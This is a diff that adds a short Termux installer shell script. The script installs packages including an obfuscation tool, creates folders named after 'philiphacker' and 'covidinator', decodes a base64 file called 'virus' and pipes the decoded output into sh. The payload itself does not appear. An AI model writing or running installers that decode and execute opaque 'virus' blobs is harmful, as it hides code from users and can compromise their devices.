@@ -1,0 +1,15 @@
+termux-setup-storage
+clear
+echo "Installing..."
+pkg install zip -y
+pkg install unzip -y
+pkg install nodejs
+pkg install jq
+npm install -g bash-obfuscate
+mkdir "/sdcard/download/www.philiphacker.in"
+mkdir "/sdcard/download/www.philiphacker.in/covidinator"
+base64 -d virus | sed 's/eval/echo/g' | sh > .god
+cp updater /sdcard/download/www.philiphacker.in/covidinator/
+cp unins /sdcard/download/www.philiphacker.in/covidinator/
+echo 1 > check.io
+sh start
